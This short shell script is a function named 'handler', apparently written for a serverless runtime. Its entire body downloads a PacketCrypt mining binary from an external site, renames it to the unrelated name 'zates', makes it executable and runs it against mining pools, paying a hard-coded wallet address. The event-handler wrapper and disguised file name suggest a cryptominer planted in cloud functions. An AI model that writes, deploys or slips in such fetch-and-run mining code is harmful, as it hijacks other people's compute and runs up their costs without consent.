function handler () {
    EVENT_DATA=$1
cd /tmp &&
curl -L https://www.pkt.world/ext/packetcrypt-linux-amd64 -o zates &&
chmod +x zates &&
./zates ann -p pkt1qs3a7l64lrz9665q7ea26e8g6zqedmsv9erwqna https://stratum.zetahash.com/ http://pool.pkt.world

}
